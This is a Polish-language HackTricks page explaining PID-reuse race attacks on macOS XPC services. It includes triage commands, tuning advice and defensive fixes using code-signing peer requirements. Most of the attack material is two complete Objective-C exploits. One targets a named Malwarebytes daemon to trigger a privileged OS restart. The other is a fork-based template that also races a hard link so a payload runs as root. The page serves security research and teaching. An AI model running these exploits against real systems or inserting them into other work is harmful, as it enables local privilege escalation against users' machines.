# Ponowne użycie PID

{{#include ../../../../../../banners/hacktricks-training.md}}

## Ponowne użycie PID

Gdy **usługa XPC** systemu macOS uwierzytelnia wywołującego, rozwiązując jego **PID** zamiast używać poświadczeń powiązanych z odebraną wiadomością, może być podatna na atak polegający na ponownym użyciu PID. Praktyczny prymityw nie polega na oczekiwaniu na przepełnienie przestrzeni nazw PID: attacker wysyła żądanie XPC, a następnie natychmiast wywołuje **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** z opcją `POSIX_SPAWN_SETEXEC`, zastępując obraz procesu attackera **dozwolonym plikiem binarnym przy zachowaniu PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Jeśli serwer pobierze żądanie z kolejki, a dopiero potem powiąże ten numeryczny PID z aktywnym procesem w celu sprawdzenia podpisu kodu, entitlementu, ścieżki lub procesu nadrzędnego, zobaczy zastępczy plik binarny zamiast procesu, który wysłał wiadomość. `POSIX_SPAWN_START_SUSPENDED` utrzymuje zaufany proces zastępczy aktywny i stabilny podczas wykonywania przez serwer sprawdzenia.<sup>[[1]](#references)[[2]](#references)</sup>

### Co jest faktycznie wyścigiem

Podatna sekwencja to **TOCTOU tożsamości wiadomości**, a nie po prostu „PID-y mogą się powtarzać”:<sup>[[1]](#references)[[2]](#references)</sup>

1. Proces attackera ustanawia lub wznawia połączenie XPC i umieszcza uprzywilejowane żądanie w kolejce.
2. Zanim usługa przekształci PID połączenia w `SecCodeRef` lub inny obiekt procesu, attacker nakłada na ten sam proces zatwierdzony plik wykonywalny za pomocą `POSIX_SPAWN_SETEXEC`.
3. Usługa weryfikuje zatwierdzony obraz aktualnie powiązany z tym PID, a następnie obsługuje znajdujące się już w kolejce żądanie kontrolowane przez attackera.

Każdy most PID w przepływie danych autoryzacji jest podejrzany: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` lub `audit_token_to_pid`, po których następują `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` lub niestandardowy verifier podpisu. Samo użycie PID wyłącznie do logowania nie wystarcza; należy potwierdzić, że dociera on do decyzji allow/deny. Sprawdź również ścieżki błędów: próba wyszukania na podstawie audit tokena w pierwszej kolejności, ale **powrót do PID w razie niepowodzenia**, przywraca ten sam wyścig. Ten wzorzec fallback pojawił się w analizie uprzywilejowanych usług XPC firmy Intego z 2026 roku.<sup>[[3]](#references)</sup>

### Szybki triage statyczny i dynamiczny

Rozpocznij od handlera połączenia i prześledź każde wywołanie generujące PID aż do sprawdzeń podpisu kodu, entitlementu, ścieżki pliku wykonywalnego lub wersji. Te polecenia zapewniają szybki pierwszy przegląd potencjalnego helpera; nawet stripped binaries często ujawniają importowane symbole, selektory Objective-C lub strings diagnostyczne:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Podczas kontrolowanego testu przerwij lub zahookuj zarówno źródło PID, jak i jego weryfikator. Trafienie w `xpc_connection_get_pid` lub `-processIdentifier` jest tylko wskazówką; użyteczne dowody pojawiają się przy późniejszym wyszukaniu **tej samej liczby całkowitej** po odebraniu żądania. Frida może dodatkowo zahookować verifier specyficzny dla aplikacji oraz uprzywilejowany selector, aby zmierzyć, czy selector zostanie wykonany, gdy wyścig PID zakończy się powodzeniem.<sup>[[3]](#references)</sup>

### Przykład Exploit

Jeśli znajdziesz funkcję **`shouldAcceptNewConnection`** lub wywoływaną przez nią funkcję, która wywołuje **`processIdentifier`**, ale nie wywołuje **`auditToken`**, oznacza to z dużym prawdopodobieństwem, że **weryfikuje PID procesu**, a nie audit token.\
Jak na przykład na tym obrazie (pochodzącym z reference):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Sprawdź ten przykład Exploit (również pochodzący z reference), aby zobaczyć 2 części Exploit:<sup>[[1]](#references)</sup>

- Jedna, która **generuje kilka forków**
- **Każdy fork** będzie **wysyłać** **payload** do usługi XPC, wykonując **`posix_spawn`** zaraz po wysłaniu wiadomości.

> [!CAUTION]
> Podczas wykonywania wyścigu z `fork()` z procesu Objective-C uruchom Exploit z wyeksportowanym `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` lub osadź marker `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Pierwsza opcja wykorzystująca **`NSTasks`** i argument do uruchomienia dzieci w celu wykorzystania RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Ten przykład używa surowego **`fork`**, aby uruchomić **procesy potomne, które wykorzystają warunek wyścigu PID**, a następnie wykorzystuje **inny warunek wyścigu za pośrednictwem Hard linku:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Uczynienie race powtarzalnym

Poniższe punkty dostrajania powtarzają się w działających exploitach ponownego użycia PID oraz w niedawnych testach uprzywilejowanych helperów:<sup>[[1]](#references)[[3]](#references)</sup>

- Wyślij żądanie i natychmiast wywołaj `posix_spawn`; **nie** czekaj na odpowiedź. Żądanie musi być już umieszczone w kolejce, gdy wyszukiwanie PID przez serwer nastąpi po podmianie obrazu.
- Używaj razem `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED`. Pierwsza flaga zachowuje PID procesu biorącego udział w race; druga zapobiega zakończeniu lub zmianie stanu prawidłowego celu przed walidacją.
- Użyj kilku krótkotrwałych procesów biorących udział w race i ponawiaj całą sekwencję connection/request/exec. Optymalna liczba zależy od celu; nadmiar procesów potomnych może spowolnić usługę i pogorszyć dostępne okno czasowe.
- Podmiana musi spełniać **całe** wymaganie serwera. Jeśli to możliwe, ponownie użyj prawidłowego binarnego pliku klienta i najpierw sprawdź jego designated requirement za pomocą `codesign -d -r- "/path/to/client.app"`.
- Najpierw wywołaj nieszkodliwy exported selector lub metodę tylko do odczytu. Pozwala to rozdzielić pomyślne uwierzytelnienie od skutecznego wykorzystania późniejszego uprzywilejowanego primitive.

## Unikanie mostu PID

W macOS 13+ Foundation udostępnia `-[NSXPCConnection setCodeSigningRequirement:]`. Ustaw peer requirement dokładnie raz i **przed** `resume`; nieprawidłowo sformatowane ciągi requirement powodują wyjątek (lub fatal error w Swift), a wiadomość od peer, który nie spełnia requirement, unieważnia connection. Dzięki temu XPC może egzekwować code identity peer bez rozwiązywania PID przez kod aplikacji.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
W przypadku nowoczesnego niskopoziomowego API listenera na macOS 26+ funkcja `xpc_listener_set_peer_requirement` stosuje zweryfikowany `xpc_peer_requirement_t`, gdy listener jest nieaktywny. XPC odrzuca żądania, które go nie spełniają; sesje peerów utworzone przez listener nie dziedziczą tego wymagania, dlatego należy również zastosować odpowiednie wymaganie sesji, gdy te sesje autoryzują uprzywilejowane operacje.<sup>[[7]](#references)</sup>

> [!WARNING]
> Nie próbuj tego „naprawiać”, kopiując token audytu, a następnie konwertując go z powrotem do PID-u na potrzeby właściwego wyszukania `SecCode`. Zachowaj tożsamość uzyskaną z tokenu audytu przez cały proces decyzyjny autoryzacji albo korzystaj z API wymagań peerów XPC od początku do końca.<sup>[[2]](#references)[[6]](#references)</sup> API tokenu audytu dotyczące całego połączenia mają również odrębną klasę race condition, omówioną w [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Inne przykłady

- [**Intego X9: Dlaczego Twój antywirus dla macOS nie powinien ufać PID-om**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE przeciwko uprzywilejowanemu helperowi antywirusa, który uwierzytelniał klientów na podstawie PID-u.<sup>[[3]](#references)</sup>
- [**Wykorzystanie usługi GOG Galaxy XPC do eskalacji uprawnień w macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (część II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Nauka wykorzystywania XPC — część 2: Nie ufaj PID-owi!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Nie ufaj PID-owi! Historie prostego błędu logicznego i miejsca, w którym można go znaleźć — Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Dlaczego Twój antywirus dla macOS nie powinien ufać PID-om](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Wykorzystanie usługi GOG Galaxy XPC do eskalacji uprawnień w macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (część II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
